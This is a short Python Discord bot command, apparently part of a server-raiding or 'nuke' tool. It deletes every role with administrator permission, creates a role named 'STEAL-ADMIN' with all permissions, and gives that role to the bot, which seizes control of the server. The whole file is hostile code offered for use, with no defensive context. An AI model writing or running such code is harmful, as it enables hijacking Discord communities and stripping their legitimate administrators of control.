import discord

async def _14(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("BOT NEEDS MANAGE ROLES PERMISSION", delete_after=3)
        return
    await ctx.send("CREATING ADMIN ROLE", delete_after=2)
    for role in ctx.guild.roles:
        if role.permissions.administrator and role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    admin_role = await ctx.guild.create_role(name="STEAL-ADMIN", permissions=discord.Permissions.all())
    await ctx.guild.me.add_roles(admin_role)
    await ctx.send("CREATED ADMIN ROLE AND ASSIGNED TO BOT")
